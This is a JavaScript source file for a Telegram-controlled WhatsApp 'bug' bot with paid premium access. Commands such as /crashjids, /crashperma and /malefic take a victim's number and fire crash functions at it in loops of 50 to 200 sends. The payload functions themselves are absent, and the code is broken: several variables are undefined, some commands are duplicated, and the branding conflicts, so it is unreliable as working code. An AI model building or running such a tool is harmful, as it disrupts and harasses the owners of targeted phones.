const { Telegraf, Markup, session } = require("telegraf");
const fs = require("fs");
const {
  default: makeWASocket,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID, moderatorID } = require("./zepsettings/zepconfig");
const moment = require('moment-timezone');

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// === TOKEN VALIDATION ===
const GITHUB_TOKEN_LIST_URL = "KASI_RAW_LU";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal ambil token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("⛔ TOKEN INVALID! Hubungi @Xwyyskontol untuk beli akses."));
    process.exit(1);
  }
  console.log(chalk.green("✅ TOKEN TERVERIFIKASI"));
}


const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363210705976689@newsletter',
    newsletterName: '',
    caption: 'Zephyrine'
}}}

// ========================= [ BOT INITIALIZATION ] =========================

const bot = new Telegraf(tokenBot);
let zep = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

// ========================= [ UTILITY FUNCTIONS ] =========================

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));


// ========================= [ PREMIUM USER MANAGEMENT ] =========================

const premiumFile = './データベース/premiumvip.json';

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};
function isModerator(userId) {
  userId = String(userId);
  return (ownerID.includes(userId) || moderatorID.includes(userId)) ? "✅" : "🚫";
}
// ========================= [ BAILEYS CONNECTION ] =========================

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Succes Connected',
        }),
    };

    zep = makeWASocket(connectionOptions);
    
    zep.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                console.log("⚠️ Tidak ada pesan masuk.");
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

            console.log(`ID SALURAN : ${chatId}`);
        } catch (error) {
            console.error("❌ Error membaca pesan:", error);
        }
    });
    
    if (usePairingCode && !zep.authState.creds.registered) {
        console.clear();
        let phoneNumber = await question(chalk.bold.white(`\nINPUT YOUR NUMBER SENDER !\n`));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await zep.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.bold.white(`YOUR CODE `), chalk.bold.white(formattedCode));
    }

    zep.ev.on('creds.update', saveCreds);
    
    global.idch = "120363405397839812@newsletter"

    zep.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            zep.newsletterFollow(global.idch);
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.white(`
Script: VOID STORM INC
Versi: 12.0
Status: `) + chalk.bold.green('Terhubung') + chalk.bold.white(`
Developer: Zephyrine
Telegram: @cursezep
Waktu: ${currentTime} WIB`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();



// ========================= [ MIDDLEWARE ] =========================

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("Nomor sender tidak di temukan atau tidak terhubung");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ Maaf, fitur ini hanya untuk pengguna premium.");
        return;
    }
    next();
};

// ========================= [ TOKEN MANAGEMENT COMMANDS (Only for Developers) ] =========================

bot.command('addtoken', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /addtoken [token_bot]");
    }
    const newToken = args[1];
    await addToken(newToken);
    ctx.reply(`✅ Berhasil menambahkan token: ${newToken}`);
});

bot.command('deltoken', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /deltoken [token_bot]");
    }
    const tokenToDelete = args[1];
    await deleteToken(tokenToDelete);
    ctx.reply(`✅ Berhasil menghapus token: ${tokenToDelete}`);
});

// ========================= [ PREMIUM USER MANAGEMENT COMMANDS ] =========================

// /addprem command
bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("Format: /addprem [user_id] [duration_in_days]");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("Durasi harus berupa angka (dalam hari).");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ Berhasil menambahkan ${userId} sebagai pengguna premium hingga ${expiryDate}`);
});

// /delprem command
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /delprem [user_id]");
    }
    const userId = args[1];
    removePremiumUser(userId);
    ctx.reply(`✅ Berhasil menghapus ${userId} dari daftar pengguna premium.`);
});

// /cekprem command
bot.command('cekprem', async (ctx) => {
    const userId = ctx.from.id;
    if (isPremiumUser(userId)) {
        const expiryDate = loadPremiumUsers()[userId];
        ctx.reply(`✅ Anda adalah pengguna premium hingga ${expiryDate}`);
    } else {
        ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// /listprem command
bot.command('listprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini.");
    }
    const premiumUsers = loadPremiumUsers();
    let message = "<b>Daftar Pengguna Premium:</b>\n";
    for (const userId in premiumUsers) {
        const expiryDate = premiumUsers[userId];
        message += `\n- ${userId}: ${expiryDate}`;
    }
    if (message === "<b>Daftar Pengguna Premium:</b>\n") {
        message = "Tidak ada pengguna premium.";
    }
    ctx.reply(message, { parse_mode: 'HTML' });
});

// ========================= [ MODERATOR MANAGEMENT COMMANDS ] =========================

bot.command('addmoderatorid', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /addmoderatorid [user_id]");
    }
    const userId = args[1];
    await addModerator(userId);
    ctx.reply(`✅ Berhasil menambahkan ${userId} sebagai moderator.`);
});

bot.command('delmoderatorid', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /delmoderatorid [user_id]");
    }
    const userId = args[1];
    await deleteModerator(userId);
    ctx.reply(`✅ Berhasil menghapus ${userId} dari daftar moderator.`);
});

// ========================= [ START MESSAGE AND MENU ] =========================

bot.start(ctx => {
    const menuMessage = `
<blockquote>
<b>╭━━━[ BLACKHEX INVICTUZ ]</b>
<b>┃ Developer : Whatitsdhes</b>
<b>┃ Version : 1.1./</b>
<b>┃ Language : Javascript</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ USER INFO ]</b>
<b>┃ Pengguna : ${ctx.from.first_name}</b>
<b>┃ Sender : ${isWhatsAppConnected ? '✅' : '❌'}</b>
<b>┃ Moderator : ${isModerator(ctx.from.id) ? '✅' : '❌'}</b>
<b>┃ Premium : ${isPremiumUser(ctx.from.id) ? '✅' : '❌'}</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ BUG MENU ]</b>
<b>┃ /crashjids</b>
<b>┃ /crashperma</b>
<b>┃ /invisiblecrash</b>
<b>┃ /malefic</b>
<b>┃ /crashapp</b>
<b>╰━━━━━━━━━━━━━━❍</b>
</blockquote>
`;

    const photoUrl = "https://files.catbox.moe/oee8rm.jpg";

    const keyboard = [
        [
            {
                text: "CONTROLS (🚯)",
                callback_data: "/menu"
            }
        ]
    ];

    ctx.replyWithPhoto(photoUrl, {
        caption: menuMessage,
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ========================= [ OWNER MENU ] =========================

bot.action('/menu', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, menu ini hanya untuk owner.");
    }

    const ownerMenu = `
<b>╭━━━[ OWNER MENU ]</b>
<b>┃ /addprem [user_id] [duration_in_days]</b>
<b>┃ /delprem [user_id]</b>
<b>┃ /cekprem</b>
<b>┃ /listprem</b>
<b>┃ /addtoken [token_bot]</b>
<b>┃ /deltoken [token_bot]</b>
<b>┃ /addmoderatorid [user_id]</b>
<b>┃ /delmoderatorid [user_id]</b>
<b>╰━━━━━━━━━━━━━━━━━━━❍</b>
    `;

    const keyboard = [
        [
            {
                text: "Back to Main Menu",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(ownerMenu, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        console.error("Error updating message:", error);
        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
            console.log("Message is not modified. Skipping update.");
            await ctx.answerCbQuery();
        } else {
            await ctx.reply("Terjadi Overload Silahkan Coba Lagi");
        }
    }
});

// ========================= [ BACK TO START HANDLER ] =========================

bot.action('/start', async (ctx) => {
    const menuMessage = `
<blockquote>
<b>╭━━━[ VOID STORM ]</b>
<b>┃ Developer : Zephyrine</b>
<b>┃ Version : 12.0</b>
<b>┃ Language : commonJs</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ USER INFO ]</b>
<b>┃ Pengguna : ${ctx.from.first_name}</b>
<b>┃ Sender : ${isWhatsAppConnected ? '✅' : '❌'}</b>
<b>┃ Moderator : ${isModerator(ctx.from.id) ? '✅' : '❌'}</b>
<b>┃ Premium : ${isPremiumUser(ctx.from.id) ? '✅' : '❌'}</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ CURSED TECHNIQUE ]</b>
<b>┃ /crashjids</b>
<b>┃ /crashperma</b>
<b>┃ /invisiblecrash</b>
<b>┃ /malefic</b>
<b>┃ /crashapp</b>
<b>╰━━━━━━━━━━━━━━❍</b>
</blockquote>
`;

    const photoUrl = "https://files.catbox.moe/cg1bdf.jpg";

    const keyboard = [
        [
            {
                text: "CONTROLS (🚯)",
                callback_data: "/menu"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: photoUrl,
            caption: menuMessage,
            parse_mode: 'HTML',
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        console.error("Error updating message:", error);
        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
            console.log("Message is not modified. Skipping update.");
            await ctx.answerCbQuery();
        } else {
            await ctx.reply("Terjadi Overload Silahkan Coba Lagi");
        }
    }
});
// ========================= [ TELEGRAM BOT COMMANDS ] =========================

bot.command('addtoken', async (ctx) => {
    if (ctx.from.id != developerId) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /addtoken [token_bot]");
    }
    const newToken = args[1];
    await addToken(newToken);
    ctx.reply(`✅ Token berhasil ditambahkan.`);
});

bot.command('deltoken', async (ctx) => {
    if (ctx.from.id != developerId) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /deltoken [token_bot]");
    }
    const tokenToDelete = args[1];
    await deleteToken(tokenToDelete);
    ctx.reply(`✅ Token berhasil dihapus.`);
}); 

bot.command("crashjids", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashjids 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 50; i++) {
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("invisiblecrash", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashjids 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 70; i++) {
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("crashperma", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await payoutzep(target);
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("crashapp", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await payoutzep(target);
    await pendingpay(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("malefic", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await vcardcrash(target);
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

//// function

// --- Jalankan Bot ---
 
(async () => {
    console.clear();
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.white(`\n

⣿⣿⣿⣿⣿⡇⢸⣿⣿⣻⣷⣄⣇⣀⣶⢠⣀⣮⣾⣿⢸⣿⣿⣿⣿⣿⠿⠿⣿⣿⣿⣿⡿⠿⠛⠛⠛⣛⠿⣿⣿⣷⣶⣯⣭⣟⣻⡿⢿⣿⣿⣿⣿⣷⣶⣯⣭⣟⣻⡿⢿⣿⣿⣿⡿
⣿⣿⣿⣿⣹⠧⢸⣿⣿⣿⣥⣦⣄⣿⢡⣴⣤⣿⣿⣿⢸⣿⠿⠋⠁⠀⠀⠁⠀⠈⠉⠁⠀⠒⠂⠀⠀⠀⠈⠑⠒⠋⠩⠛⠛⠿⢿⣿⣿⣿⣾⣿⣽⣿⣿⣿⣿⣿⢿⣿⣿⣷⣾⣷⣴
⣿⣿⣿⣿⣿⡎⡸⣿⣿⣿⣿⣤⣧⣡⣼⣿⣿⣿⣿⣿⠸⠃⠀⠀⠀⠀⡠⠂⠤⠄⠀⠀⢀⢀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠈⠈⢙⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢞⡋⠽⠛⠻
⣿⣿⣿⡿⣿⡅⢠⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⡀⠔⠈⠉⠀⠀⠀⠈⠉⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠈⢶⠶⠖⠒⠂⢬⠢⢝⢿⣿⣿⠟⣋⠥⠒⠋⠁⠀⠀⠀⢰
⣿⣿⣿⣷⡿⢲⢸⣷⣝⣻⢿⣿⣿⣿⣿⣿⠿⠛⠁⠹⡄⠀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠀⠀⠀⢀⠳⡒⠲⠲⠶⠆⠀⠑⢉⠀⠈⢀⣀⣀⣀⣀⡀⠀⠀⠀
⣿⣿⣿⣿⣧⠸⢸⣿⣿⣿⣿⣷⣿⡶⣵⠆⡴⠀⠀⠀⠀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢦⠀⠀⠀⠀⠀⢦⢱⢀⣤⠀⠀⢠⠰⠆⠱⣴⣿⣿⣿⡿⣿⣿⣦⠀⠶
⣿⣿⣿⡟⣏⠀⣾⣿⣿⣿⣿⡿⣫⡾⢃⡼⠁⡀⢀⢆⠎⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠆⠀⠀⢀⢀⠀⢣⠀⠀⠀⠀⠀⠂⣂⠠⠉⠂⠈⠁⠀⢀⠹⡝⠿⠛⠉⢻⣿⣿⡆⢀
⣿⣿⣿⣿⡇⡆⣿⣿⣿⣿⣿⣾⠟⣠⡿⠁⡐⢀⢮⠆⠁⠀⠀⠀⡀⣯⠀⠀⠄⣧⠐⢀⡘⣧⢰⠀⠂⠠⢇⠆⠂⠡⡄⠀⠀⠀⠈⠴⠀⠀⠀⠠⡁⠀⠀⠀⢣⠀⠀⠀⠘⣿⣿⣷⠀
⣿⣿⣿⣿⡅⠃⣿⣿⣿⣿⣿⢋⣴⡟⠀⡔⢀⡺⠃⠀⡀⢀⠃⠀⣇⣿⠀⠀⠀⢚⠀⠀⡀⣰⠈⠀⢸⠀⠚⡜⠈⣁⠱⡀⠀⠀⠀⠀⢩⠀⠄⠈⠀⠀⠀⠀⢸⠀⠀⠀⠐⣿⣿⣿⡆
⣿⣿⣿⣹⠂⢸⣿⡿⣽⣿⢏⣾⡟⠠⡹⠁⡠⠁⠀⠐⠀⠂⠀⠀⡇⡿⠀⠀⢀⠘⡆⠀⠀⠈⠀⠀⠀⣀⠈⠁⠁⠉⡀⣱⢁⢀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⡆⡆⠀⠀⢿⣿⣿⡇
⣿⣿⣿⣿⢱⢸⣿⣽⣿⢇⣾⡿⢁⢢⠃⠠⠁⠀⠀⠂⠀⠀⢸⢸⡇⠁⠀⡄⠘⠀⠄⠀⠀⠀⢤⠀⡄⢸⡀⢸⠀⠀⠀⠀⢣⠄⠔⡀⠀⠄⠀⠰⠀⠀⠀⠁⠀⡇⣧⠓⠐⢾⣿⣿⣇
⣿⣿⣿⡟⠀⣸⣷⣿⡟⣼⣿⠃⡌⠊⠀⡐⢀⠀⠀⠀⠀⠠⠤⢹⣷⠀⠀⡇⠀⠀⠐⠀⠀⠀⢾⠀⢦⢸⡇⠘⠀⠀⠀⠀⢉⠘⡔⢡⠀⠐⠀⠀⠀⠀⠀⠀⠄⢱⢁⢰⡄⢿⣿⣿⣿
⣿⣿⡇⡷⠀⣿⣿⣿⢹⣿⡏⢸⠀⠃⠀⠀⠀⠀⠀⠀⠀⠲⣷⢸⣿⠀⠄⡇⡌⠀⠀⠀⠀⠀⢸⣻⣾⡀⣷⠈⠀⠀⡀⠀⠀⠔⠲⢉⡖⠀⠃⠀⠄⠀⠀⠬⠀⢸⢸⠁⠰⢸⣿⣿⣿
⣿⣿⣇⡃⠀⣿⣿⡟⣿⣿⠃⣿⠘⠀⠀⠀⠀⡐⠈⠀⢈⢛⠓⠘⠛⡆⠀⡇⣏⡇⠀⠀⠀⠀⠈⢉⣩⡄⣿⠀⠀⢀⡇⠀⠁⠐⠐⠊⣹⠂⠘⠀⠂⠀⠬⠁⠌⢸⠀⡦⠃⢸⣿⣿⣿
⠿⠿⠀⠀⠀⣿⣿⡿⣿⡿⢁⣃⠀⡄⠀⠂⠐⠀⠀⠀⡼⣿⣿⡴⣾⣧⠀⠀⣿⣿⡤⠀⠀⠀⢀⣾⢯⡇⣿⠀⢸⢼⣷⠀⠀⠃⢀⠆⠡⡆⠀⠄⠀⠌⠀⢀⠂⠸⠀⣇⠀⢾⣿⣿⣿
⡄⢟⡆⠿⠉⣶⢣⢣⣶⠖⠘⣿⣇⠃⢠⠀⠀⠠⠈⢠⣿⣿⣿⣿⡿⣿⣆⠀⣿⣿⣿⣵⣄⠀⢘⣷⣾⡗⡟⠀⣾⣾⡟⠀⠀⠀⠃⠀⡌⢡⠀⠀⠀⠌⠀⠀⠀⡄⢠⢸⠀⢸⣿⣿⡟
⠹⠸⠧⠀⢀⡟⢈⠞⢃⡴⣾⣿⣿⢀⡀⠀⠀⠄⠀⡈⢈⣩⡍⠐⠋⢽⣿⡆⢻⣿⣿⣿⣿⢆⡨⠟⡚⠁⠁⠈⢙⡩⠇⠀⠀⠀⢈⡁⠀⣼⠀⠀⠠⠁⠀⠀⢠⠃⢸⠈⡄⠈⣿⠟⠸
⡂⠀⣄⣀⢈⡁⣈⡀⠈⢷⣿⣿⡟⠘⠃⠀⢀⠀⡀⢇⠸⣿⡃⠀⢀⠸⣽⢷⣾⣿⣿⣿⣿⣞⣡⣴⡃⠀⠀⠐⠚⡷⠀⡀⢂⠀⢺⡅⠀⢹⠀⡆⠠⠀⠀⠀⡾⠀⠸⠀⢑⠀⠉⠀⡄
⠇⠐⠿⠿⠇⠁⠟⠓⠘⢠⣿⣿⠃⠘⠀⠀⠀⡆⢡⣸⣎⣿⣇⠀⠈⣰⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⣆⠀⠀⣰⣃⡀⣷⠸⠀⣹⠇⠀⠘⠀⡇⠀⠀⠀⡼⠁⠀⠀⠀⢀⣼⣯⠀⠀
⠄⣀⣂⣠⠀⢠⡤⣀⢠⣾⣿⣿⠀⠆⠈⠀⢠⡷⢸⡁⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⠅⣿⠐⠀⢸⣇⠀⠀⠀⠇⠀⠀⡼⠁⡀⠀⠀⣰⣿⣿⣿⡆⢠
⠠⣯⣭⢤⠀⠸⣴⣿⠨⣿⣿⣿⢠⠀⠃⢠⢸⠇⣧⢣⢷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣽⠀⡄⣿⢹⠀⠀⣦⠀⡠⠋⠀⢠⠀⠁⢸⢹⣿⡿⠋⡆⢈
⢘⣋⣛⣛⠀⢰⣿⣿⣷⣿⣿⣿⠀⠠⢰⠀⣿⠀⣿⢧⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣞⡟⢠⢰⢿⠀⠀⠀⠈⠐⠋⠀⠀⡄⠘⠀⡏⡏⠏⠀⠀⡇⠈
⢸⣷⣿⡥⠀⢸⣿⣿⣿⣿⣿⡇⠃⠀⠈⣇⣾⡅⡿⣾⣎⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣸⣿⢇⣮⣿⡾⡟⠀⠈⠀⠀⠀⠀⠠⠀⠂⢀⣵⣿⣦⠀⠀⡇⢰
⢨⣭⣭⡽⠀⢸⣿⣿⣿⣿⣿⠇⠀⠀⣷⡿⣿⡗⢿⣿⣿⣮⡻⣿⣿⣿⣿⠟⢛⣛⣛⣛⣿⢿⣿⣿⣿⣿⣿⣟⣵⣿⣿⣾⣾⡏⠁⠀⠀⠀⡀⠌⠀⠀⠰⢀⠃⠘⣿⣿⡿⠃⡔⡇⢰
⢸⣟⣶⣦⠀⢸⣿⣿⣿⣿⡿⡀⠀⠀⢸⣿⣿⣷⢸⣿⣿⣃⠀⠝⠻⣿⣿⣦⣿⣿⣿⣿⣿⣟⣼⣿⣿⣿⣿⣿⣿⣿⠟⢉⣾⠃⠀⣤⠀⠠⠍⢠⠂⢠⠀⡎⢠⡆⠘⢫⠀⠀⣇⡇⠘
⣌⡉⢤⠦⠀⣧⣿⣿⣿⣿⣱⡇⠀⠸⣼⣿⣿⣿⣧⣻⢳⡏⡨⠄⢠⣎⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⣠⣿⠏⠀⡎⠁⠀⠜⢠⠏⠀⡎⠐⠀⢿⣤⣾⡄⢰⡤⣿⡇⠀
⣿⣿⣶⣌⠁⣿⣾⣿⡿⣸⣿⣄⢀⠠⢿⣿⣿⣿⣿⣏⡟⣰⠰⠂⡞⡄⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⣴⣿⠋⡄⢳⠋⠀⡌⠀⡞⡀⡸⠁⠈⣄⣿⣿⣿⣿⡸⠳⢋⡇⠀
⣙⠻⠛⠉⢀⣿⣿⡿⢱⣿⣿⣿⣷⣄⠸⣿⣿⣿⣿⡽⡥⡃⣄⣁⡘⠁⠀⡆⠀⠀⡙⠛⠟⠛⠉⠀⠀⠀⠀⢠⣾⣿⢃⣾⡇⡞⠬⡐⢠⢤⢡⠀⡃⠀⠀⢿⡼⣿⠟⣡⣿⡈⣾⠃⡌
⢸⣿⣿⣃⠘⠻⡿⣣⣿⣿⣿⣿⣿⣿⣧⠻⣿⣿⣟⠣⣠⡄⡟⠀⡟⢀⢀⠀⠀⢠⠣⢠⠀⠀⠀⠀⠀⠀⣠⡿⢿⡇⣼⣿⠇⡘⡇⠀⡘⠀⠘⠸⠇⠀⣼⠸⣻⣣⢠⡿⡟⣇⣿⢀⠃
⣶⣦⣤⣄⢀⣀⠘⡟⠿⠿⠿⠋⠉⠏⠉⡛⠛⠛⠋⠾⠿⡳⣛⡄⣱⣾⠈⠘⠀⢈⡧⢸⣷⣄⠀⢀⣠⣾⣿⢷⡟⣼⣿⣋⠀⠆⠀⢠⡷⠀⡀⠜⠐⢰⣯⣷⣿⣷⡈⣇⠻⣸⡏⠌⣐
